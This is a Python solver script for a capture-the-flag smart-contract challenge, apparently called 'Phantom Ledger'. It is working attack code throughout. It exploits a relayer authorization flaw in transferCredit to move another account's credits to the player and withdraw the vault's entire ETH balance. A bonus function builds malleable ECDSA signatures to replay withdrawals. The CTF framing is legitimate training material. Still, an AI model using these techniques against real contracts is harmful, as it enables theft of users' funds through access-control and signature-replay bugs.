#!/usr/bin/env python3
"""
Phantom Ledger — Full Working Solver
=====================================
Exploits:
1. transferCredit auth bug: relayer can transfer ANY account's credits
2. ECDSA malleability: raw ecrecover allows signature replay
3. Cross-function reentrancy: transferCredit has no nonReentrant

This solver uses the SIMPLEST path (transferCredit auth bug) to drain the vault.
"""

import json
import sys
from pathlib import Path
from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_defunct

# ================================================================
# CONFIGURATION — Fill these from the CTF instance
# ================================================================
RPC_URL = ""  # Replace with instance RPC URL
SETUP_ADDR = ""                    # Replace with Setup contract address
PLAYER_KEY = ""                    # Replace with player private key

# ================================================================
# HELPERS
# ================================================================
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def load_abi(name):
    """Load ABI from compiled artifacts."""
    path = Path(f"compiled/{name}.json")
    if not path.exists():
        # Try alternate paths
        for p in [Path(f"../compiled/{name}.json"), Path(f"out/{name}.json")]:
            if p.exists():
                path = p
                break
    data = json.loads(path.read_text())
    return data["abi"], data.get("bytecode", {}).get("object", "")


def send_tx(w3, player, tx):
    """Sign and send a transaction, return receipt."""
    tx["from"] = player.address
    tx["nonce"] = w3.eth.get_transaction_count(player.address)
    tx["gas"] = tx.get("gas", 3000000)
    tx["gasPrice"] = w3.eth.gas_price
    signed = player.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def malleable_sig(sig_bytes):
    """Compute the malleable signature (s' = n - s, v flipped)."""
    r = int.from_bytes(sig_bytes[0:32], "big")
    s = int.from_bytes(sig_bytes[32:64], "big")
    v = sig_bytes[64]

    s_prime = SECP256K1_N - s
    v_prime = 28 if v == 27 else 27

    return (
        r.to_bytes(32, "big") +
        s_prime.to_bytes(32, "big") +
        bytes([v_prime])
    )


# ================================================================
# MAIN SOLVER
# ================================================================
def solve(rpc_url, setup_addr, player_key):
    print("=" * 60)
    print("  PHANTOM LEDGER — SOLVER")
    print("=" * 60)

    # --- Connect ---
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), "Failed to connect to RPC"
    player = Account.from_key(player_key)
    print(f"\n[+] Connected to chain {w3.eth.chain_id}")
    print(f"[+] Player: {player.address}")
    print(f"[+] Player ETH: {w3.from_wei(w3.eth.get_balance(player.address), 'ether')} ETH")

    # --- Load contracts ---
    setup_abi, _ = load_abi("Setup.sol/Setup")
    vault_abi, _ = load_abi("PhantomVault.sol/PhantomVault")
    exploit_abi, exploit_bytecode = load_abi("Exploit.sol/Exploit")

    setup = w3.eth.contract(address=setup_addr, abi=setup_abi)
    vault_addr = setup.functions.vault().call()
    vault = w3.eth.contract(address=vault_addr, abi=vault_abi)

    owner_addr = vault.functions.owner().call()
    relayer_addr = vault.functions.relayer().call()
    fee_recipient = vault.functions.feeRecipient().call()

    print(f"\n[+] Vault:         {vault_addr}")
    print(f"[+] Vault ETH:     {w3.from_wei(w3.eth.get_balance(vault_addr), 'ether')} ETH")
    print(f"[+] Owner (Setup): {owner_addr}")
    print(f"[+] Relayer:       {relayer_addr}")
    print(f"[+] FeeRecipient:  {fee_recipient}")
    print(f"[+] Player == Relayer: {player.address.lower() == relayer_addr.lower()}")

    owner_balance = vault.functions.balances(owner_addr).call()
    player_balance = vault.functions.balances(player.address).call()
    print(f"\n[+] Owner vault balance:  {w3.from_wei(owner_balance, 'ether')} ETH")
    print(f"[+] Player vault balance: {w3.from_wei(player_balance, 'ether')} ETH")

    # --- METHOD 1: Direct transferCredit (simplest) ---
    print("\n" + "=" * 60)
    print("  METHOD 1: transferCredit Auth Bug")
    print("=" * 60)
    print("[*] Player IS the relayer")
    print("[*] transferCredit allows: msg.sender == from || msg.sender == relayer")
    print("[*] So player (relayer) can transfer Setup's credits to themselves!")

    # Step 1: Transfer Setup's credits to player
    print(f"\n[*] Step 1: transferCredit({owner_addr[:10]}..., {player.address[:10]}..., {w3.from_wei(owner_balance, 'ether')} ETH)")
    tx = vault.functions.transferCredit(
        owner_addr, player.address, owner_balance
    ).build_transaction({
        "from": player.address,
        "nonce": w3.eth.get_transaction_count(player.address),
        "gas": 200000,
        "gasPrice": w3.eth.gas_price,
    })
    receipt = send_tx(w3, player, tx)
    print(f"[+] TX: {receipt.transactionHash.hex()}")
    print(f"[+] Status: {'OK' if receipt.status == 1 else 'FAILED'}")

    new_player_bal = vault.functions.balances(player.address).call()
    print(f"[+] Player vault balance now: {w3.from_wei(new_player_bal, 'ether')} ETH")

    # Step 2: Withdraw everything
    print(f"\n[*] Step 2: withdraw({w3.from_wei(new_player_bal, 'ether')} ETH)")
    tx = vault.functions.withdraw(new_player_bal).build_transaction({
        "from": player.address,
        "nonce": w3.eth.get_transaction_count(player.address),
        "gas": 200000,
        "gasPrice": w3.eth.gas_price,
    })
    receipt = send_tx(w3, player, tx)
    print(f"[+] TX: {receipt.transactionHash.hex()}")
    print(f"[+] Status: {'OK' if receipt.status == 1 else 'FAILED'}")

    # --- Verify ---
    print("\n" + "=" * 60)
    print("  VERIFICATION")
    print("=" * 60)
    vault_eth = w3.eth.get_balance(vault_addr)
    solved = setup.functions.isSolved().call()
    print(f"[+] Vault ETH remaining: {w3.from_wei(vault_eth, 'ether')} ETH")
    print(f"[+] isSolved(): {solved}")

    if solved:
        print("\n[+] ✅ CHALLENGE SOLVED!")
    else:
        print("\n[-] ❌ Not solved yet")

    return solved


# ================================================================
# ECDSA MALLEABILITY DEMO (bonus — shows the crypto vulnerability)
# ================================================================
def demo_ecdsa_malleability(w3, player, vault, vault_addr):
    """
    Demonstrates the ECDSA malleability vulnerability.
    This is the CRYPTO component of the challenge.
    """
    print("\n" + "=" * 60)
    print("  BONUS: ECDSA Malleability Demo")
    print("=" * 60)

    # Deposit 1 ETH
    tx = vault.functions.deposit().build_transaction({
        "from": player.address,
        "nonce": w3.eth.get_transaction_count(player.address),
        "gas": 100000,
        "gasPrice": w3.eth.gas_price,
        "value": w3.to_wei(1, "ether"),
    })
    send_tx(w3, player, tx)
    print(f"[+] Deposited 1 ETH to vault")

    # Sign a withdrawal message
    to = player.address
    amount = w3.to_wei(1, "ether")
    nonce = 42

    inner_hash = w3.solidity_keccak(
        ["address", "uint256", "uint256", "address"],
        [to, amount, nonce, vault_addr]
    )
    msg_hash = w3.solidity_keccak(
        ["string", "bytes32"],
        ["\x19Ethereum Signed Message:\n32", inner_hash]
    )

    signed = w3.eth.account.signHash(msg_hash, player.key)
    sig_bytes = signed.signature

    # Compute malleable signature
    mal_sig = malleable_sig(sig_bytes)

    print(f"[+] Original sig hash:  {w3.keccak(sig_bytes).hex()}")
    print(f"[+] Malleable sig hash: {w3.keccak(mal_sig).hex()}")
    print(f"[+] Hashes differ: {w3.keccak(sig_bytes) != w3.keccak(mal_sig)}")

    # Both recover the same signer
    r1 = int.from_bytes(sig_bytes[0:32], "big")
    s1 = int.from_bytes(sig_bytes[32:64], "big")
    v1 = sig_bytes[64]
    signer1 = w3.eth.account._recover_hash(msg_hash, vrs=(v1, r1, s1))

    r2 = int.from_bytes(mal_sig[0:32], "big")
    s2 = int.from_bytes(mal_sig[32:64], "big")
    v2 = mal_sig[64]
    signer2 = w3.eth.account._recover_hash(msg_hash, vrs=(v2, r2, s2))

    print(f"[+] Signer from original:  {signer1}")
    print(f"[+] Signer from malleable: {signer2}")
    print(f"[+] Same signer: {signer1 == signer2}")


# ================================================================
# ENTRY POINT
# ================================================================
if __name__ == "__main__":
    if len(sys.argv) >= 4:
        rpc = sys.argv[1]
        setup = sys.argv[2]
        key = sys.argv[3]
    else:
        rpc = RPC_URL
        setup = SETUP_ADDR
        key = PLAYER_KEY

    if not setup or not key:
        print("Usage: python3 solve.py <RPC_URL> <SETUP_ADDR> <PLAYER_KEY>")
        print("   Or: Set RPC_URL, SETUP_ADDR, PLAYER_KEY at the top of the file")
        sys.exit(1)

    solve(rpc, Web3.to_checksum_address(setup), key)
